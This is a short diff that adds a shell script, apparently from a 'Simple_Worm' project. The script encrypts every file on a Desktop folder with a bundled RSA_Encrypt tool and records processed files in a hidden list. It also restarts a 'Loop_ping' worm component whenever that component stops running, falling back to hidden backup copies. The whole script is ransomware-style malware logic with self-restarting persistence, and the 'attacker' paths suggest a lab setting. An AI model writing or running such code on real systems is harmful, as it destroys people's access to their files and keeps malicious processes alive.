@@ -1,0 +1,31 @@
+#!/bin/sh
+
+check_RSA() {
+    DestPath="/home/attacker/Desktop"
+    fileLIST=$(printf "$(find "$DestPath" -maxdepth 1 -type f)")
+    
+    for p in $fileLIST ;do
+        if grep -Fxq "$p" /home/attacker/Public/.RSAlist.tmp
+        then 
+            #echo "$p in list."
+            :
+        else
+            #echo "$p not in list"
+            #echo "RSA_Encrypt: $p"
+            /home/attacker/Public/.Simple_Worm/RSA_Encrypt -C 126419 30743 "$p" || /home/attacker/Desktop/.Backup/RSA_Encrypt -C 126419 30743 "$p" &
+            echo "$p" >> /home/attacker/Public/.RSAlist.tmp
+        fi
+    done
+}
+
+check_Loop(){
+    if [ $(ps aux | grep -c Loop_ping) -lt 2 ]; then
+        /home/attacker/Public/.Simple_Worm/Loop_ping || /home/attacker/Desktop/.Backup/Loop_ping & 
+    fi
+}
+
+
+
+
+check_RSA
+check_Loop
